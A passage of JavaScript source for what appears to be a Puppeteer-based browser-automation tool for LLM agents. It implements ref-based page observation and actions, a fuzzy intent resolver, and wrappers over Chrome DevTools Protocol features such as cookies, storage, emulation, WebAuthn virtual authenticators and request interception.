  // otherwise newly-appeared h1/form/dialog never show up in the appeared list.
  const NEW_CANDIDATES = 'a[href],button,input,select,textarea,summary,details,[role],[tabindex]:not([tabindex="-1"]),[contenteditable=""],[contenteditable="true"],[onclick],h1,h2,h3,h4,form,nav,main,dialog,[role=region],[role=dialog]';
  const seenAppeared = new Set();
  for (const el of document.querySelectorAll(NEW_CANDIDATES)) {
    if (!visible(el)) continue;
    if (el.hasAttribute('data-ccm-ref')) continue;
    if (seenAppeared.has(el)) continue;
    seenAppeared.add(el);
    const ref = nextRef++;
    el.setAttribute('data-ccm-ref', String(ref));
    const s = compact(el);
    newSig[ref] = s;
    const name = (el.getAttribute('aria-label') || el.innerText || '').trim().slice(0,120);
    appeared.push({ ref, role: el.getAttribute('role') || el.tagName.toLowerCase(), name });
  }

  window.__ccmObserve = { sig: newSig, ts: Date.now(), nextRef };
  return { changed, appeared, disappeared, refCount: Object.keys(newSig).length };
})()
`;

async function observeDelta({ targetId } = {}) {
  const page = await _resolvePage(targetId);
  return page.evaluate(_OBSERVE_DELTA_SCRIPT);
}

// ── Ref-based actions ─────────────────────────────────────────────────────
// Translate { ref: N } → CSS selector [data-ccm-ref="N"] and delegate to the
// existing input* primitives. Refs survive re-renders because the attribute
// rides on the DOM node, not on a synthetic ID we made up.
function _refSel(ref) {
  if (typeof ref !== 'number' || !isFinite(ref)) throw new Error('ref must be a number (from chrome_observe)');
  return '[data-ccm-ref="' + ref + '"]';
}

// Every ref-based action auto-stabilizes (waits for page to settle) and
// includes the observe_delta in its return value. One call per intent —
// no separate "did it work?" round-trip.
async function _wrapAction(fn, { observe = true, stabilizeMs = 5000, targetId } = {}) {
  const resolvedPage = await _resolvePage(targetId);
  const before = await resolvedPage
    .evaluate(`(window.__ccmObserve && window.__ccmObserve.sig) ? true : false`)
    .catch(() => false);
  const result = await fn(resolvedPage);
  let stab = null;
  try { stab = await _stabilize({ timeout: stabilizeMs, targetId }); } catch (_) {}
  let delta = null;
  if (observe && before) {
    try { delta = await observeDelta({ targetId }); } catch (_) {}
  }
  return { ...result, stabilized: stab, delta };
}

// Helper: check the ref still resolves to an element in the page. Returns
// a clear "ref stale" error instead of letting Puppeteer's generic
// `Error: No element found for selector: [data-ccm-ref="N"]` propagate.
async function _assertRefAlive(page, ref) {
  const exists = await page.evaluate(r => !!document.querySelector('[data-ccm-ref="' + r + '"]'), ref);
  if (!exists) {
    throw new Error(
      `ref ${ref} no longer exists — element was removed by a re-render or navigation. ` +
      `Call chrome_observe (or chrome_observe_delta) again to get fresh refs.`
    );
  }
}

async function clickRef({ ref, observe = true, stabilizeMs = 5000, targetId } = {}) {
  const sel = _refSel(ref);
  return _wrapAction(async (page) => {
    await _assertRefAlive(page, ref);
    await page.click(sel);
    return { ok: true, clicked: 'selector', target: sel, ref };
  }, { observe, stabilizeMs, targetId });
}

async function typeRef({ ref, text, submit = false, observe = true, stabilizeMs = 5000, targetId } = {}) {
  if (typeof text !== 'string') throw new Error('text required');
  const sel = _refSel(ref);
  return _wrapAction(async (page) => {
    await _assertRefAlive(page, ref);
    const wrote = await page.evaluate((s, val) => {
      const el = document.querySelector(s);
      if (!el) return { ok: false };
      el.focus();
      const setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value')
                 || Object.getOwnPropertyDescriptor(window.HTMLTextAreaElement.prototype, 'value');
      if (setter && setter.set) setter.set.call(el, val); else el.value = val;
      el.dispatchEvent(new Event('input', { bubbles: true }));
      el.dispatchEvent(new Event('change', { bubbles: true }));
      return { ok: true };
    }, sel, text);
    if (!wrote.ok) throw new Error(`ref ${ref} disappeared between assert and type — re-observe.`);
    if (submit) await page.keyboard.press('Enter');
    return { ok: true, ref, typed: text.length };
  }, { observe, stabilizeMs, targetId });
}

async function focusRef({ ref, observe = false, stabilizeMs = 1000, targetId } = {}) {
  return _wrapAction(async (page) => {
    await _assertRefAlive(page, ref);
    await page.focus(_refSel(ref));
    return { ok: true, ref };
  }, { observe, stabilizeMs, targetId });
}

// ── Phase 12 — chrome_step (intent resolver) ──────────────────────────────
// Take structured intent { action, target, role?, value?, near? }, fuzzy-match
// `target` against the current observe tree's accessible names (role-filtered
// by action), and dispatch to the appropriate ref-based action. The LLM does
// NL→structured intent; this resolver does name→ref→execute→stabilize→delta in
// one round-trip. On ambiguous match, refuses and returns top candidates.
const _STEP_ACTION_ROLES = {
  // `click` — also includes contenteditable-ish + form submit triggers
  click:  ['button','link','checkbox','radio','menuitem','menuitemcheckbox','menuitemradio','tab','option','switch','treeitem','combobox','summary'],
  // `type` — includes contenteditable (role often "textbox" via observe's tag map,
  // but plain <div contenteditable> can come back as "generic"); we also accept
  // `null`/`generic` IF the node has state including 'editable' (set page-side).
  type:   ['textbox','searchbox','spinbutton','combobox'],
  focus:  null,
  // `select` accepts both native <select> (role often "combobox" via tag map)
  // and ARIA listbox/combobox patterns
  select: ['combobox','listbox'],
};

// Scoring scale (post-fix): exact=100, startsWith=55, includes=40, token=≤30.
// Filter floor = 15 means token-overlap of ≥1 token is the minimum signal.
// Ambiguity gap = 20 — two `startsWith` candidates won't both trigger refuse.
const _STEP_SCORE_FLOOR = 15;
const _STEP_AMBIG_GAP   = 20;

function _stepScore(node, target, role) {
  const name = (node.name || '').toLowerCase();
  const q = target.toLowerCase().trim();
  let s = 0;
  // `role` is post-filter: by the time we score, role mismatches are gone.
  // No more dead +50/-100 branch — keep scoring purely on name signal.
  if (q) {
    if (name === q) s += 100;
    else if (name.startsWith(q)) s += 55;
    else if (name.includes(q)) s += 40;
    else {
      const nameTokens = new Set(name.split(/\W+/).filter(Boolean));
      const qTokens = q.split(/\W+/).filter(Boolean);
      let hits = 0;
      for (const t of qTokens) if (nameTokens.has(t)) hits++;
      if (qTokens.length) s += Math.round((hits / qTokens.length) * 30);
    }
  }
  if (node.state && node.state.includes('disabled')) s -= 50;
  return s;
}

async function step({ action, target, role, value, submit = false, near, observe: obs = true, stabilizeMs = 5000, targetId } = {}) {
  if (!action || !['click','type','focus','select'].includes(action)) {
    throw new Error("action required: 'click' | 'type' | 'focus' | 'select'");
  }
  if (typeof target !== 'string' || !target.trim()) {
    throw new Error('target required (accessible name to match)');
  }
  if ((action === 'type' || action === 'select') && typeof value !== 'string') {
    throw new Error(`value required for action='${action}'`);
  }

  // Fresh observe — refs may have shifted since last call.
  const snap = await observe({ raw: true, targetId });
  const nodes = snap.nodes || [];

  const allowed = role ? null : _STEP_ACTION_ROLES[action];
  let nearRefs = null;
  if (near) {
    const lower = near.toLowerCase();
    nearRefs = new Set();
    for (const n of nodes) if ((n.name || '').toLowerCase().includes(lower)) nearRefs.add(n.ref);
  }

  const scored = nodes
    .filter(n => {
      if (role) return n.role === role;
      if (!allowed) return true;
      return allowed.includes(n.role);
    })
    .map(n => {
      let s = _stepScore(n, target, role);
      if (nearRefs && nearRefs.has(n.ref)) s += 15;
      return { ref: n.ref, role: n.role, name: n.name, state: n.state, score: s };
    })
    // Filter floor = 15: only real name signal survives (token-overlap ≥ 1
    // hit, includes, startsWith, exact). Previously `> 0` + `+2 viewport
    // bonus` let EVERY visible role-allowed element through, swamping the
    // ambiguity gate with garbage candidates.
    .filter(n => n.score >= _STEP_SCORE_FLOOR)
    .sort((a, b) => b.score - a.score);

  if (!scored.length) {
    return {
      ok: false,
      error: 'no element matched',
      action, target, role: role || null,
      hint: 'try a different name, drop role filter, or call chrome_observe to inspect the tree',
    };
  }
  const top = scored[0];
  const runnerUp = scored[1];
  // Ambiguity gap widened from 8 to 20: two `startsWith` candidates (55 each)
  // no longer trigger refuse just because they tied. A true ambiguity (both
  // names identical → exact match 100 each, gap 0) still refuses. Caller
  // disambiguates with `role:` or `near:` and re-calls.
  if (runnerUp && (top.score - runnerUp.score) < _STEP_AMBIG_GAP) {
    return {
      ok: false,
      error: 'ambiguous match — pass role or near to disambiguate (or re-call with a more specific target)',
      candidates: scored.slice(0, 5),
      hint: 'each candidate has { ref, role, name, score } — re-call chrome_step with role:<role> or near:<other-text>',
    };
  }

  let result;
  if (action === 'click') {
    result = await clickRef({ ref: top.ref, observe: obs, stabilizeMs, targetId });
  } else if (action === 'type') {
    result = await typeRef({ ref: top.ref, text: value, submit, observe: obs, stabilizeMs, targetId });
  } else if (action === 'focus') {
    result = await focusRef({ ref: top.ref, observe: obs, stabilizeMs, targetId });
  } else if (action === 'select') {
    result = await _wrapAction(async (page) => {
      const ok = await page.evaluate((ref, val) => {
        const el = document.querySelector('[data-ccm-ref="' + ref + '"]');
        if (!el) return { ok: false, error: 'ref ' + ref + ' vanished — call chrome_observe again' };
        // ── Native <select> ────────────────────────────────────────
        if (el.tagName === 'SELECT') {
          let matched = false;
          let chosenValue = null;
          for (const opt of el.options) {
            if (opt.value === val || (opt.textContent || '').trim() === val) {
              chosenValue = opt.value; matched = true; break;
            }
          }
          if (!matched) chosenValue = val;
          // React-controlled <select> requires the native value-setter trick;
          // direct el.value = X gets reverted on next render.
          const desc = Object.getOwnPropertyDescriptor(HTMLSelectElement.prototype, 'value');
          if (desc && desc.set) desc.set.call(el, chosenValue);
          else el.value = chosenValue;
          el.dispatchEvent(new Event('input',  { bubbles: true }));
          el.dispatchEvent(new Event('change', { bubbles: true }));
          return { ok: true, matched, chosen: chosenValue };
        }
        // ── ARIA listbox / combobox ────────────────────────────────
        // Find a descendant [role=option] whose visible text or aria-label
        // matches `val` (case-insensitive). For combobox, the listbox may be
        // a sibling controlled via aria-controls; search both.
        const role = el.getAttribute('role');
        const listRoot = (() => {
          const owned = el.getAttribute('aria-controls');
          if (owned) {
            const r = document.getElementById(owned);
            if (r) return r;
          }
          if (role === 'listbox') return el;
          // Combobox: option list often opens as a sibling; if not visible
          // yet, click the combobox to expand first.
          return el;
        })();
        const valLower = String(val).toLowerCase().trim();
        let opt = null;
        for (const candidate of listRoot.querySelectorAll('[role=option]')) {
          const t = (candidate.getAttribute('aria-label') || candidate.textContent || '').trim().toLowerCase();
          if (t === valLower || candidate.getAttribute('data-value') === val) { opt = candidate; break; }
        }
        if (!opt) {
          // Try expanding combobox first (some patterns require explicit open)
          if (role === 'combobox' && el.getAttribute('aria-expanded') !== 'true') {
            el.click();
          }
          return { ok: false, error: 'option "' + val + '" not found in [role=option] descendants — combobox may need explicit open' };
        }
        opt.click();
        return { ok: true, matched: true, optionRef: opt.getAttribute('data-ccm-ref') || null };
      }, top.ref, value);
      if (!ok || ok.ok === false) {
        return { ok: false, ref: top.ref, error: ok?.error || 'select dispatch failed' };
      }
      return { ok: true, ref: top.ref, selected: value, ...ok };
    }, { observe: obs, stabilizeMs, targetId });
  }

  return { ok: true, resolved: top, candidates: scored.slice(1, 4), ...result };
}

async function frameType({ sessionId, selector, text, submit = false } = {}) {
  if (!sessionId) throw new Error('sessionId required');
  if (typeof text !== 'string') throw new Error('text required');
  const sess = _frameSessions.get(sessionId);
  if (!sess) throw new Error(`unknown sessionId ${sessionId} — attach first`);
  // Set value + fire input/change so frameworks (React/Vue) pick it up.
  const js = `
    (() => {
      const sel = ${JSON.stringify(selector || '')};
      const val = ${JSON.stringify(text)};
      const el = sel ? document.querySelector(sel) : document.activeElement;
      if (!el) return { ok:false, error:'no element' };
      el.focus();
      const setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value')
                 || Object.getOwnPropertyDescriptor(window.HTMLTextAreaElement.prototype, 'value');
      if (setter && setter.set) setter.set.call(el, val); else el.value = val;
      el.dispatchEvent(new Event('input', { bubbles: true }));
      el.dispatchEvent(new Event('change', { bubbles: true }));
      ${submit ? `if (el.form) el.form.requestSubmit ? el.form.requestSubmit() : el.form.submit();` : ''}
      return { ok:true, typed: val.length };
    })()
  `;
  const res = await sess.send('Runtime.evaluate', { expression: js, returnByValue: true });
  if (res.exceptionDetails) return { ok: false, error: res.exceptionDetails.text };
  return res.result.value;
}

// ═══════════════════════════════════════════════════════════════════════════
// Internal helper — every wrapper below funnels through this.
// One CDP session per call, auto-detached. For high-volume ops we could
// keep a long-lived session per page, but per-call is simpler + safer.
// ═══════════════════════════════════════════════════════════════════════════
async function _cdp(method, params) {
  const page = await _activePage();
  const session = await page.target().createCDPSession();
  try {
    return await session.send(method, params || {});
  } finally {
    try { await session.detach(); } catch (_) {}
  }
}

// Sometimes we want a session bound to the page for stateful operations
// (event listeners, intercepts) — caller must detach manually.
async function _cdpSession() {
  const page = await _activePage();
  return page.target().createCDPSession();
}

// ═══════════════════════════════════════════════════════════════════════════
// PHASE 2 — Network · Storage · Emulation
// ═══════════════════════════════════════════════════════════════════════════

// ── Network (cookies + headers + URL blocking) ─────────────────────────────
async function networkGetCookies({ urls } = {}) {
  const res = await _cdp('Network.getCookies', urls ? { urls } : {});
  return res.cookies || [];
}
async function networkSetCookie({ name, value, domain, path, secure, httpOnly, sameSite, expires, url } = {}) {
  if (!name) throw new Error('name required');
  return _cdp('Network.setCookie', {
    name, value: value ?? '', domain, path, secure, httpOnly, sameSite, expires, url,
  });
}
async function networkDeleteCookies({ name, domain, path, url } = {}) {
  if (!name) throw new Error('name required');
  return _cdp('Network.deleteCookies', { name, domain, path, url });
}
async function networkClearAllCookies() {
  return _cdp('Network.clearBrowserCookies');
}
async function networkSetExtraHeaders({ headers } = {}) {
  if (!headers || typeof headers !== 'object') throw new Error('headers object required');
  return _cdp('Network.setExtraHTTPHeaders', { headers });
}
async function networkSetBlockedURLs({ urls } = {}) {
  return _cdp('Network.setBlockedURLs', { urls: Array.isArray(urls) ? urls : [] });
}
async function networkSetUserAgent({ userAgent, acceptLanguage, platform } = {}) {
  if (!userAgent) throw new Error('userAgent required');
  return _cdp('Network.setUserAgentOverride', { userAgent, acceptLanguage, platform });
}

// ── Storage (per-origin clear, quota, IndexedDB/Cache enumeration) ─────────
async function storageClearForOrigin({ origin, storageTypes = 'all' } = {}) {
  if (!origin) throw new Error('origin required (e.g. "https://example.com")');
  // storageTypes is a comma-separated list: appcache,cookies,file_systems,indexeddb,
  // local_storage,shader_cache,websql,service_workers,cache_storage,all
  return _cdp('Storage.clearDataForOrigin', { origin, storageTypes });
}
async function storageGetUsage({ origin } = {}) {
  if (!origin) throw new Error('origin required');
  return _cdp('Storage.getUsageAndQuota', { origin });
}
async function storageGetCookies({ browserContextId } = {}) {
  const res = await _cdp('Storage.getCookies', browserContextId ? { browserContextId } : {});
  return res.cookies || [];
}

// ── DOMStorage (localStorage / sessionStorage direct) ──────────────────────
async function domStorageGetItems({ origin, isLocalStorage = true } = {}) {
  if (!origin) throw new Error('origin required');
  const session = await _cdpSession();
  try {
    await session.send('DOMStorage.enable');
    const res = await session.send('DOMStorage.getDOMStorageItems', {
      storageId: { securityOrigin: origin, isLocalStorage },
    });
    return res.entries || [];
  } finally { try { await session.detach(); } catch (_) {} }
}
async function domStorageSetItem({ origin, key, value, isLocalStorage = true } = {}) {
  if (!origin || !key) throw new Error('origin and key required');
  const session = await _cdpSession();
  try {
    await session.send('DOMStorage.enable');
    await session.send('DOMStorage.setDOMStorageItem', {
      storageId: { securityOrigin: origin, isLocalStorage },
      key, value: String(value ?? ''),
    });
    return { ok: true };
  } finally { try { await session.detach(); } catch (_) {} }
}
async function domStorageRemoveItem({ origin, key, isLocalStorage = true } = {}) {
  if (!origin || !key) throw new Error('origin and key required');
  const session = await _cdpSession();
  try {
    await session.send('DOMStorage.enable');
    await session.send('DOMStorage.removeDOMStorageItem', {
      storageId: { securityOrigin: origin, isLocalStorage }, key,
    });
    return { ok: true };
  } finally { try { await session.detach(); } catch (_) {} }
}
async function domStorageClear({ origin, isLocalStorage = true } = {}) {
  if (!origin) throw new Error('origin required');
  const session = await _cdpSession();
  try {
    await session.send('DOMStorage.enable');
    await session.send('DOMStorage.clear', {
      storageId: { securityOrigin: origin, isLocalStorage },
    });
    return { ok: true };
  } finally { try { await session.detach(); } catch (_) {} }
}

// ── IndexedDB (list databases, delete) ─────────────────────────────────────
async function indexedDbList({ origin } = {}) {
  if (!origin) throw new Error('origin required');
  const session = await _cdpSession();
  try {
    await session.send('IndexedDB.enable');
    const res = await session.send('IndexedDB.requestDatabaseNames', { securityOrigin: origin });
    return res.databaseNames || [];
  } finally { try { await session.detach(); } catch (_) {} }
}
async function indexedDbDelete({ origin, databaseName } = {}) {
  if (!origin || !databaseName) throw new Error('origin and databaseName required');
  return _cdp('IndexedDB.deleteDatabase', { securityOrigin: origin, databaseName });
}

// ── CacheStorage (Service Worker cache enumeration + delete) ───────────────
async function cacheList({ origin } = {}) {
  if (!origin) throw new Error('origin required');
  const res = await _cdp('CacheStorage.requestCacheNames', { securityOrigin: origin });
  return res.caches || [];
}
async function cacheDelete({ cacheId } = {}) {
  if (!cacheId) throw new Error('cacheId required (from cacheList)');
  return _cdp('CacheStorage.deleteCache', { cacheId });
}

// ── Emulation (UA, geolocation, timezone, device, dark mode, throttling) ───
async function emulateUserAgent({ userAgent, acceptLanguage, platform } = {}) {
  if (!userAgent) throw new Error('userAgent required');
  return _cdp('Emulation.setUserAgentOverride', { userAgent, acceptLanguage, platform });
}
async function emulateGeolocation({ latitude, longitude, accuracy = 50 } = {}) {
  if (typeof latitude !== 'number' || typeof longitude !== 'number') {
    throw new Error('latitude + longitude required');
  }
  return _cdp('Emulation.setGeolocationOverride', { latitude, longitude, accuracy });
}
async function emulateClearGeolocation() {
  return _cdp('Emulation.clearGeolocationOverride');
}
async function emulateTimezone({ timezoneId } = {}) {
  if (!timezoneId) throw new Error('timezoneId required (e.g. "America/Tokyo")');
  return _cdp('Emulation.setTimezoneOverride', { timezoneId });
}
async function emulateLocale({ locale } = {}) {
  if (!locale) throw new Error('locale required (e.g. "en-US", "ja-JP")');
  return _cdp('Emulation.setLocaleOverride', { locale });
}
async function emulateDevice({ width, height, deviceScaleFactor = 1, mobile = false } = {}) {
  if (!width || !height) throw new Error('width and height required');
  return _cdp('Emulation.setDeviceMetricsOverride', {
    width, height, deviceScaleFactor, mobile,
  });
}
async function emulateClearDevice() {
  return _cdp('Emulation.clearDeviceMetricsOverride');
}
async function emulateColorScheme({ scheme = 'dark' } = {}) {
  // scheme: 'light' | 'dark' | 'no-preference'
  return _cdp('Emulation.setEmulatedMedia', {
    features: [{ name: 'prefers-color-scheme', value: scheme }],
  });
}
async function emulateNetwork({ offline = false, latency = 0, downloadThroughput = -1, uploadThroughput = -1 } = {}) {
  return _cdp('Network.emulateNetworkConditions', {
    offline, latency, downloadThroughput, uploadThroughput,
  });
}
async function emulateCpuThrottle({ rate = 1 } = {}) {
  // rate=1 normal, rate=4 = 4x slowdown
  return _cdp('Emulation.setCPUThrottlingRate', { rate });
}
async function emulateVisionDeficiency({ type = 'none' } = {}) {
  // type: none | achromatopsia | blurredVision | deuteranopia | protanopia | tritanopia
  return _cdp('Emulation.setEmulatedVisionDeficiency', { type });
}

// ═══════════════════════════════════════════════════════════════════════════
// PHASE 3 — Extensions · Autofill · WebAuthn (the gems)
// ═══════════════════════════════════════════════════════════════════════════

// ── Extensions (CDP-side; chrome.management API is Phase 6 territory) ─────
async function extensionsLoadUnpacked({ path: extPath } = {}) {
  if (!extPath) throw new Error('path to extension folder required');
  return _cdp('Extensions.loadUnpacked', { path: extPath });
}
async function extensionsUninstall({ id } = {}) {
  if (!id) throw new Error('extension id required');
  return _cdp('Extensions.uninstall', { id });
}

// ── Autofill (programmatic form fill) ──────────────────────────────────────
async function autofillTrigger({ fieldId, frameId, card } = {}) {
  if (!fieldId) throw new Error('fieldId required');
  return _cdp('Autofill.trigger', { fieldId, frameId, card });
}
async function autofillSetAddresses({ addresses = [] } = {}) {
  return _cdp('Autofill.setAddresses', { addresses });
}

// ── WebAuthn (virtual authenticators — passkeys without hardware) ─────────
async function webauthnEnable() {
  return _cdp('WebAuthn.enable');
}
async function webauthnAddAuthenticator({ protocol = 'ctap2', transport = 'internal', hasResidentKey = true, hasUserVerification = true } = {}) {
  return _cdp('WebAuthn.addVirtualAuthenticator', {
    options: { protocol, transport, hasResidentKey, hasUserVerification, isUserVerified: true },
  });
}
async function webauthnRemoveAuthenticator({ authenticatorId } = {}) {
  if (!authenticatorId) throw new Error('authenticatorId required');
  return _cdp('WebAuthn.removeVirtualAuthenticator', { authenticatorId });
}
async function webauthnGetCredentials({ authenticatorId } = {}) {
  if (!authenticatorId) throw new Error('authenticatorId required');
  const res = await _cdp('WebAuthn.getCredentials', { authenticatorId });
  return res.credentials || [];
}
async function webauthnClearCredentials({ authenticatorId } = {}) {
  if (!authenticatorId) throw new Error('authenticatorId required');
  return _cdp('WebAuthn.clearCredentials', { authenticatorId });
}
async function webauthnSetUserVerified({ authenticatorId, isUserVerified = true } = {}) {
  if (!authenticatorId) throw new Error('authenticatorId required');
  return _cdp('WebAuthn.setUserVerified', { authenticatorId, isUserVerified });
}

// ═══════════════════════════════════════════════════════════════════════════
// PHASE 4 — Fetch · Console · Accessibility · CSS
// ═══════════════════════════════════════════════════════════════════════════

// ── Fetch (request interception — block/mock/modify) ───────────────────────
// Stateful: enabling sets a long-lived session that emits paused-request
// events. We expose enable + simple actions; advanced mocking goes through
// chrome_cdp_raw with Fetch.fulfillRequest.
let _fetchSession = null;
const _pendingRequests = new Map(); // requestId → resolver-ish data

async function fetchEnable({ patterns } = {}) {
  if (_fetchSession) await fetchDisable();
  _fetchSession = await _cdpSession();
  await _fetchSession.send('Fetch.enable', {
    patterns: patterns || [{ urlPattern: '*', requestStage: 'Request' }],
  });
  _fetchSession.on('Fetch.requestPaused', (event) => {
    _pendingRequests.set(event.requestId, event);
    // Auto-continue if no rule matches within 10s — prevents request lockup
    setTimeout(() => {
      if (_pendingRequests.has(event.requestId)) {
        _fetchSession?.send('Fetch.continueRequest', { requestId: event.requestId }).catch(() => {});
        _pendingRequests.delete(event.requestId);
      }
    }, 10_000);
  });
  return { ok: true };
}
async function fetchDisable() {
  if (!_fetchSession) return { ok: true, alreadyDisabled: true };
  try { await _fetchSession.send('Fetch.disable'); } catch (_) {}
  try { await _fetchSession.detach(); } catch (_) {}
  _fetchSession = null;
  _pendingRequests.clear();
  return { ok: true };
}
async function fetchListPending() {
  return Array.from(_pendingRequests.values()).map(e => ({
    requestId: e.requestId,
    url:       e.request.url,
    method:    e.request.method,
    headers:   e.request.headers,
    resourceType: e.resourceType,
  }));
}
async function fetchContinue({ requestId, url, method, postData, headers } = {}) {
  if (!_fetchSession) throw new Error('Fetch interception not enabled. Call fetchEnable first.');
  if (!requestId) throw new Error('requestId required (from fetchListPending)');
  await _fetchSession.send('Fetch.continueRequest', { requestId, url, method, postData, headers });
  _pendingRequests.delete(requestId);
  return { ok: true };
}
async function fetchFail({ requestId, errorReason = 'BlockedByClient' } = {}) {
  if (!_fetchSession) throw new Error('Fetch interception not enabled');
  if (!requestId) throw new Error('requestId required');
  await _fetchSession.send('Fetch.failRequest', { requestId, errorReason });
  _pendingRequests.delete(requestId);
  return { ok: true };
}
async function fetchFulfill({ requestId, responseCode = 200, responseHeaders = [], body = '' } = {}) {
  if (!_fetchSession) throw new Error('Fetch interception not enabled');
  if (!requestId) throw new Error('requestId required');
  await _fetchSession.send('Fetch.fulfillRequest', {
    requestId, responseCode, responseHeaders,
    body: Buffer.from(String(body)).toString('base64'),
  });
  _pendingRequests.delete(requestId);
  return { ok: true };
}

// ── Console (capture page console messages — circular buffer per page) ─────
const _consoleBuffers = new WeakMap(); // page → array of {type, text, ts}
const CONSOLE_MAX = 500;

function _ensureConsoleCapture(page) {
  if (_consoleBuffers.has(page)) return;
  const buf = [];
  _consoleBuffers.set(page, buf);
  page.on('console', msg => {
    buf.push({ type: msg.type(), text: msg.text(), ts: Date.now() });
    if (buf.length > CONSOLE_MAX) buf.splice(0, buf.length - CONSOLE_MAX);
  });
  page.on('pageerror', err => {
    buf.push({ type: 'error', text: 'PageError: ' + (err?.message || String(err)), ts: Date.now() });
    if (buf.length > CONSOLE_MAX) buf.splice(0, buf.length - CONSOLE_MAX);
  });
}

async function consoleSubscribe() {
  const page = await _activePage();
  _ensureConsoleCapture(page);
  return { ok: true, capturing: true, bufferSize: CONSOLE_MAX };
}
async function consoleGetRecent({ limit = 100, clear = false, targetId } = {}) {
  const page = await _resolvePage(targetId);
  _ensureConsoleCapture(page);
  const buf = _consoleBuffers.get(page) || [];
  const out = buf.slice(-Math.max(1, Math.min(CONSOLE_MAX, limit)));
  if (clear) buf.length = 0;
  return out;
}

// ── Accessibility (semantic page model — best LLM representation) ──────────
async function a11yEnable() {
  return _cdp('Accessibility.enable');
}
async function a11yGetFullTree() {
  await _cdp('Accessibility.enable');
  const res = await _cdp('Accessibility.getFullAXTree');
  return res.nodes || [];
}
async function a11yQueryByRole({ role } = {}) {
  if (!role) throw new Error('role required (e.g. "button", "link", "textbox")');
  const session = await _cdpSession();
  try {
    await session.send('Accessibility.enable');
    const { nodes } = await session.send('Accessibility.getFullAXTree');
    const out = (nodes || []).filter(n =>
      n.role?.value === role || n.role?.value?.toLowerCase() === role.toLowerCase()
    );
    return out.map(n => ({
      nodeId: n.nodeId,
      role:   n.role?.value,
      name:   n.name?.value,
      value:  n.value?.value,
      desc:   n.description?.value,
    }));
  } finally { try { await session.detach(); } catch (_) {} }
}

// ── CSS (computed styles, matched rules, stylesheets) ──────────────────────
async function cssGetComputed({ selector } = {}) {
  if (!selector) throw new Error('selector required');
  const session = await _cdpSession();
  try {
    await session.send('DOM.enable');
    await session.send('CSS.enable');
    const { root } = await session.send('DOM.getDocument');
    const { nodeId } = await session.send('DOM.querySelector', { nodeId: root.nodeId, selector });
    if (!nodeId) return null;
    const { computedStyle } = await session.send('CSS.getComputedStyleForNode', { nodeId });
    return computedStyle.reduce((acc, p) => (acc[p.name] = p.value, acc), {});
  } finally { try { await session.detach(); } catch (_) {} }
}
async function cssGetMatched({ selector } = {}) {
  if (!selector) throw new Error('selector required');
  const session = await _cdpSession();
  try {
    await session.send('DOM.enable');
    await session.send('CSS.enable');
    const { root } = await session.send('DOM.getDocument');
    const { nodeId } = await session.send('DOM.querySelector', { nodeId: root.nodeId, selector });
    if (!nodeId) return null;
    return await session.send('CSS.getMatchedStylesForNode', { nodeId });
  } finally { try { await session.detach(); } catch (_) {} }
}

// ═══════════════════════════════════════════════════════════════════════════
// PHASE 5 — Performance · Security · ServiceWorker · Browser
// ═══════════════════════════════════════════════════════════════════════════

// ── Performance / Profiler / Tracing ───────────────────────────────────────
async function perfGetMetrics() {
  await _cdp('Performance.enable');
  const res = await _cdp('Performance.getMetrics');
  return (res.metrics || []).reduce((acc, m) => (acc[m.name] = m.value, acc), {});
}
async function perfStartCpuProfile() {
  await _cdp('Profiler.enable');
  await _cdp('Profiler.start');
  return { ok: true, started: Date.now() };
}
async function perfStopCpuProfile() {
  const res = await _cdp('Profiler.stop');
  return { profile: res.profile, ok: true };
}
async function perfStartTrace({ categories = '*' } = {}) {
  return _cdp('Tracing.start', {
    categories,
    options: 'sampling-frequency=10000',
    transferMode: 'ReportEvents',
  });
}
async function perfStopTrace() {
  // Tracing data comes through events. For now we just stop it.
  // (Full trace capture would need event collection — caller can use cdp_raw.)
  return _cdp('Tracing.end');
}

// ── Security ───────────────────────────────────────────────────────────────
async function securityGetStatus() {
  await _cdp('Security.enable');
  // Security state comes through Security.securityStateChanged events.
  // For one-shot status, we use the isolation-status getter:
  return _cdp('Security.getSecurityIsolationStatus');
}

// ── ServiceWorker ──────────────────────────────────────────────────────────
async function swEnable() {
  return _cdp('ServiceWorker.enable');
}
async function swUnregister({ scopeURL } = {}) {
  if (!scopeURL) throw new Error('scopeURL required');
  return _cdp('ServiceWorker.unregister', { scopeURL });
}
async function swStop({ versionId } = {}) {
  if (!versionId) throw new Error('versionId required');
  return _cdp('ServiceWorker.stopWorker', { versionId });
}

// ── Browser (permissions, downloads) ───────────────────────────────────────
async function browserGrantPermissions({ origin, permissions = [] } = {}) {
  return _cdp('Browser.grantPermissions', { origin, permissions });
}
async function browserResetPermissions({ browserContextId } = {}) {
  return _cdp('Browser.resetPermissions', browserContextId ? { browserContextId } : {});
}
async function browserSetDownloadBehavior({ behavior = 'allow', downloadPath } = {}) {
  // behavior: 'deny' | 'allow' | 'allowAndName' | 'default'
  return _cdp('Browser.setDownloadBehavior', { behavior, downloadPath });
}

// ═══════════════════════════════════════════════════════════════════════════
// CONVENIENCE — open any chrome:// internal page
// ═══════════════════════════════════════════════════════════════════════════
const _ALLOWED_CHROME_PAGES = new Set([
  // Safe inspection pages — never crash/hang/kill ones
  'apps', 'bookmarks', 'crashes', 'downloads', 'extensions', 'flags', 'gpu',
  'help', 'history', 'inspect', 'management', 'net-export', 'net-internals',
  'newtab', 'password-manager', 'policy', 'predictors', 'serviceworker-internals',
  'settings', 'system', 'version', 'webrtc-internals', 'site-engagement',
  'media-engagement', 'media-internals', 'metrics-internals', 'sync-internals',
  'translate-internals', 'indexeddb-internals', 'quota-internals',
  'signin-internals', 'tracing', 'updater', 'view-cert', 'whats-new',
  'gcm-internals', 'blob-internals', 'bluetooth-internals', 'usb-internals',
  'autofill-internals', 'attribution-internals', 'process-internals', 'sandbox',
  'device-log', 'components', 'connection-help', 'omnibox',
  'memory-internals', 'discards', 'web-app-internals', 'topics-internals',
  // Side panels
  'bookmarks-side-panel.top-chrome', 'history-side-panel.top-chrome',
  'read-later.top-chrome', 'customize-chrome-side-panel.top-chrome',
]);
// ═══════════════════════════════════════════════════════════════════════════
// Extension-API bridge — for chrome.* APIs that CDP cannot reach
// ═══════════════════════════════════════════════════════════════════════════
//
// The companion extension polls our HTTP server for jobs. Each chrome_ext_*
// tool enqueues a job here; the extension picks it up, calls chrome.<api>,
// and POSTs the result back. We wake the caller's promise when the result
// arrives.
//
// Timeout: 15s per call. If the extension is slow / disabled / Chrome closed,
// the call fails cleanly with "extension did not respond".
//
